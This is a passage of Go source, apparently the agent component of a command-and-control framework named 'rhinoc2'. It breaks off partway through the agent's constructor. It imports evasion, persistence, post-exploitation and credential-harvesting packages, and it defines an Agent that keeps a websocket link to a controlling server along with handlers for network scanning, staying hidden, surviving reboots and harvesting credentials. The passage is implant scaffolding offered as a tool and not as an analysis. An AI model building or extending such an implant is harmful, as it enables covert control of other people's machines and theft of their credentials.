package main

import (
	"encoding/json"
	"fmt"
	"io"
	"log"
	"os"
	"rhinoc2/pkg/commands"
	"rhinoc2/pkg/crypto"
	"rhinoc2/pkg/evasion"
	"rhinoc2/pkg/persistence"
	"rhinoc2/pkg/postexploit"
	"runtime"
	"strings"
	"time"

	"github.com/gorilla/websocket"
)

type Config struct {
	ServerURL string
	Key       string
	Interval  time.Duration
}

type Agent struct {
	id          string
	config      Config
	conn        *websocket.Conn
	crypto      *crypto.CryptoHandler
	commander   *commands.Commander
	fileMgr     *commands.FileManager
	netScanner  *commands.NetworkScanner
	evasion     *evasion.EvasionHandler
	persistence *persistence.PersistenceHandler
	credHarvest *postexploit.CredentialHarvester
}

func generateID() string {
	b, _ := crypto.GenerateRandomBytes(16)
	return fmt.Sprintf("%x", b)
}

func newAgent(config Config) *Agent {
	ph, _ := persistence.NewPersistenceHandler()
	return &Agent{
		id:          generateID(),
		config:      config,
		crypto:      crypto.NewCryptoHandler(config.Key),
